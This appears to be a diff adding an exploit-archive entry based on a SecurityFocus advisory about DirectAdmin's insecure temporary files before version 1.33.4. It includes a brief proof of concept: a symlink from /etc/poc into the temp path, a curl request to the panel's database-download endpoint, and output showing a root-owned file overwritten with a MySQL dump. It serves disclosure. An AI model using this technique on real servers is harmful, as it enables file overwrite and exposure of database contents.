@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/34676/info
+
+DirectAdmin creates temporary files in an insecure manner.
+
+An attacker with local access could potentially exploit this issue to perform symbolic link attacks to overwrite arbitrary attacker-specified files. This could facilitate a complete compromise of the affected computer.
+
+Versions prior to DirectAdmin 1.33.4 are vulnerable. 
+
+On server: $ ln -s /etc/poc /home/tmp/database_name.gz
+On client: $ curl http://www.example.com:2222/CMD_DB/database_name.gz
+On server:
+$ ls -la /etc/poc
+-rw-r--r-- 1 root root 514 Apr 22 09:05 /etc/poc
+$ zcat /etc/poc | head -1
+-- MySQL dump 10.9 
